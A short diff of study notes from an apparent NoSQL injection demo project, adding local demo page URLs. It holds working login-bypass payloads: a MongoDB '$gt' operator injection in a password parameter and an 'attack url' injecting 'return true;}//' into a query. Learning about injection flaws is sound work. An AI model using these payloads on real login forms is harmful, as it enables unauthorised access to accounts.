@@ -20,6 +20,7 @@ gt mean more than
 
 (2)
 information-match
+http://localhost/github/NoSQLInjectionAttackDemo/demo_1.html
 correct url
 http://localhost/github/NoSQLInjectionAttackDemo/test_query1.php?username=1&password=1
 wrong url
@@ -58,3 +59,12 @@ password：1234','injection':'injection（自己发现的）
 
 http://10.0.0.61:80/injection/login/login.php?username=sunxiuyang&password[$gt]=&login-submit=login
 gt 大于
+
+(5)
+http://localhost/github/NoSQLInjectionAttackDemo/demo_2.html
+
+login success
+http://localhost/github/NoSQLInjectionAttackDemo/login/demo_2.php?password=111&login-submit=submit
+
+attack url
+http://localhost/github/NoSQLInjectionAttackDemo/login/demo_2.php?password=123;return%20true;}//
